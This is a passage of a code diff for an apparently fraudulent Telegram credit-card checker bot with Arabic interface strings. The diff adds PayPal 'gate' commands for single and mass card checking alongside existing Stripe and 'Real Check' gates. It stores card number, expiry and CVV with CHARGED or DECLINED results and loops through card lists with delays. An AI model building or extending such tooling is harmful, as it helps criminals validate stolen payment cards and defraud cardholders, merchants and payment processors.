+                        cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
+                        status = "CHARGED" if approved else "DECLINED"
+                        DataManager.save_paypal_result(cc_str, status, resp)
+                    
                     time.sleep(delay)
                     
                 except Exception as e:
@@ -900,7 +1402,7 @@ class CommandHandler:
             return
         card = Helpers.parse_card(parts[1])
         if not card:
-            bot.reply_to(message, "❌ صيغة غير صحيحة")
+            bot.reply_to(message, "❌ صيغة غير صحيحة\nمثال: 4111111111111111|12|25|123")
             return
         self.check_single_card(message, card, gate)
     
@@ -959,9 +1461,8 @@ class CallbackHandler:
             self.handler.handle_stop(call.message)
             bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")
 
-# ==================== خادم الويب لـ cron-job.org ====================
+# ==================== خادم الويب ====================
 def run_web_server():
-    """تشغيل خادم HTTP لـ cron-job.org"""
     try:
         PORT = int(os.environ.get('PORT', 10000))
         
@@ -992,7 +1493,7 @@ def setup():
     handler = CommandHandler()
     callback = CallbackHandler(handler)
     
-    # تشغيل خادم الويب في thread منفصل
+    # تشغيل خادم الويب
     web_thread = threading.Thread(target=run_web_server, daemon=True)
     web_thread.start()
     
@@ -1026,6 +1527,12 @@ def setup():
     @bot.message_handler(commands=['chkm'])
     def real_mass(m): handler.handle_mass(m, 'real')
     
+    @bot.message_handler(commands=['pp'])
+    def paypal(m): handler.handle_single(m, 'paypal')
+    
+    @bot.message_handler(commands=['ppm'])
+    def paypal_mass(m): handler.handle_mass(m, 'paypal')
+    
     @bot.message_handler(content_types=['document'])
     def doc(m): handler.handle_file_upload(m)
     
@@ -1042,12 +1549,16 @@ def setup():
                 handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
         else:
             if Helpers.get_chat_type(m.chat.id) == "private":
-                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
+                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>\n\nالبوابات المتاحة:\n/st - Stripe\n/chk - Real Check\n/pp - PayPal", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
     
     @bot.callback_query_handler(func=lambda c: True)
     def cb(c): callback.handle(c)
     
     print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
+    print(Fore.CYAN + "📌 البوابات المتاحة:" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   💳 Stripe - /st و /mass" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   ✅ Real Check - /chk و /chkm" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   💰 PayPal - /pp و /ppm" + Style.RESET_ALL)
     
     bot.infinity_polling()
 
@@ -1057,4 +1568,3 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\n⚠️ تم الإيقاف")
         sys.exit(0)
-        
